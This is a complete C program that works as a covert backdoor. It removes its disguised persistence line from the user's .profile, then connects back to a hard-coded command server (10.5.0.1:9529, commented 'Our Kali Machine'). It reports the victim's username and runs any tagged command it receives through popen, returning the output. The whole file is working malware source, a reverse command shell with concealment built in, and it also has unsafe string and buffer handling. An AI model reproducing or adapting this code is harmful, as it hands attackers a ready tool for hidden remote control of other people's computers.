#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

void do_command(char* command, char *output, int output_size) {
	FILE *fp;
	bzero(output, output_size);
	fp = popen(command, "r");
	if (fp == NULL) { // The command failed :(
		return;
	}
	int position = 0;
	char buf[1024];
	while (fgets(buf, 1024, fp) != NULL) {
		strncpy(output + position, buf, strlen(buf));
		position += strlen(buf);
	}
	pclose(fp);
}

//Remove the culprit line from .profile
void a() { 
	char *file = "/.profile";
	char *tmp_file = "/.profile.tmp";
	const char* home = getenv("HOME");
	char big_path[strlen(home) + strlen(file)];
	strncpy(big_path, home, strlen(home));
	strncpy(big_path + strlen(home), file, strlen(file));
	char second_path[strlen(home) + strlen(tmp_file)];
	strncpy(second_path, home, strlen(home));
	strncpy(second_path + strlen(home), tmp_file, strlen(tmp_file));
	char *command = "nohup /usr/lib/x86_64-linux-gnu/indicator-application-service 2>/dev/null &";
	FILE *original_profile = fopen(big_path, "r");
	FILE *new_profile = fopen(second_path, "w");
	ssize_t read;
	size_t len = 0;
	char* line = NULL;
	if (original_profile == NULL) {
		return;
	}

	if (new_profile == NULL) {
		return;
	}
	
	while ((read = getline(&line, &len, original_profile)) != -1) {
		if (strncmp(line, command, strlen(command)) == 0) {
		} else {
			fwrite(line, 1, strlen(line), new_profile);
		}
	}
	rename(second_path, big_path);
	fclose(new_profile);
	fclose(original_profile);

}

void b(){
	int sockfd;
	char send[100];
	char recv[100];
	char username[24];
	const char* ip = "10.5.0.1"; // Our Kali Machine
	const char* code = "HACSFWEPFOWEJFPO";
	int port = 9529;
	do_command("/usr/bin/whoami", username, 24); // Grab the username
	username[strlen(username) - 1] = '\0'; // Remove newline from username
	struct sockaddr_in servaddr;
	servaddr.sin_family=AF_INET;
	servaddr.sin_port=htons(port);
	inet_pton(AF_INET, ip, &servaddr.sin_addr);

	while (1) {
		sockfd = socket(AF_INET, SOCK_STREAM, 0);
		if (sockfd < 0) {
			// printf("Error creating socket\n");
			exit(1);
		}
		while(1) { // Continually try to connect...
			int result = connect(sockfd, (struct sockaddr *) &servaddr, sizeof(servaddr));
			if (result < 0) {
				// printf("Failed... Trying again (%d)\n", errno);
			} else {
				break; 
			}
			sleep(3);
		}
		//We connected! Now to tell the command server who we are
		write(sockfd, username, sizeof(username));
		while (1) { // Now listen for commands from the server
			char read_buffer[1024];
			bzero(read_buffer, 1024);
			int result = read(sockfd, read_buffer, 1024);
			if (result <= 0) {
				close(sockfd);
				break;
			}
			if (result < strlen(code)) {
				break;
			} else {
				if (strncmp(read_buffer, code, strlen(code)) == 0) { // Check for tag at beginning of message to make sure its legit
					char actual_command[1024];
					bzero(actual_command, 1024);
					strncpy(actual_command, read_buffer + strlen(code), strlen(read_buffer) - strlen(code));
					char result[1024];
					bzero(result, 1024);
					do_command(actual_command, result, 1024);
					result[strlen(result) - 1] = '\0'; // Remove newline from username
					write(sockfd, result, 1024);
				}
			}
		}
	}
}

int main() {
	a();
	b();
}
